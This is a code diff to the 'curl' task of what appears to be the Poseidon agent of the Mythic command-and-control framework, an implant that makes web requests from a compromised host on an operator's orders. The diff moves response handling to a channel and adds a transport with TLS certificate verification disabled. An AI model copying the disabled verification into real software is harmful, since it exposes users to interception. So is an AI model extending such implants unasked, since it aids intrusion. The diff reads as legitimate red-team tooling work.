@@ -3,20 +3,18 @@ package curl
 import (
 	// Standard
 	"bytes"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"io/ioutil"
 	"net/http"
 	"strings"
-	"sync"
 	"time"
 
 	// Poseidon
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
+
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
-
-var mu sync.Mutex
 
 type Arguments struct {
 	Url     string `json:"url"`
@@ -37,11 +35,7 @@ func Run(task structs.Task) {
 		msg.UserOutput = err.Error()
 		msg.Completed = true
 		msg.Status = "error"
-
-		resp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, resp)
-		mu.Unlock()
+		task.Job.SendResponses <- msg
 		return
 	}
 
@@ -56,8 +50,12 @@ func Run(task structs.Task) {
 		rawHeaders, _ = base64.StdEncoding.DecodeString(args.Headers)
 	}
 
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
 	client := &http.Client{
-		Timeout: 30 * time.Second,
+		Timeout:   30 * time.Second,
+		Transport: tr,
 	}
 
 	var respBody []byte
@@ -87,11 +85,7 @@ func Run(task structs.Task) {
 		msg.UserOutput = err.Error()
 		msg.Completed = true
 		msg.Status = "error"
-
-		resp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, resp)
-		mu.Unlock()
+		task.Job.SendResponses <- msg
 		return
 	}
 
@@ -103,19 +97,12 @@ func Run(task structs.Task) {
 		msg.UserOutput = err.Error()
 		msg.Completed = true
 		msg.Status = "error"
-
-		resp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, resp)
-		mu.Unlock()
+		task.Job.SendResponses <- msg
 		return
 	}
 
 	msg.Completed = true
 	msg.UserOutput = string(respBody)
-	r, _ := json.Marshal(msg)
-	mu.Lock()
-	profiles.TaskResponses = append(profiles.TaskResponses, r)
-	mu.Unlock()
+	task.Job.SendResponses <- msg
 	return
 }
